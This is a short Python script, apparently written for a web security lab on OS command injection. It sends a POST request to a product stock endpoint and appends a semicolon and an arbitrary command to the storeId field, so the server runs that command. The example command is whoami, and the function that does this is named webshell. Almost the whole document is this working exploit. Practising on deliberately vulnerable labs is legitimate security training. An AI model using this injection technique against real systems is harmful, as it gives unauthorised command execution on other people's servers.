import requests as r


# Lab: OS command injection, simple case

# goal : exec whoami command

# server side: stockreport.sh productId storeId; CMD

link="" # endpoint /product/stock




def webshell(malicious_cmd):
    myrequest = r.post(link, data={"productId":"2", "storeId":"1;"+ malicious_cmd})

    response = myrequest.text 

    print(response)


if __name__=='__main__':
    webshell("whoami")








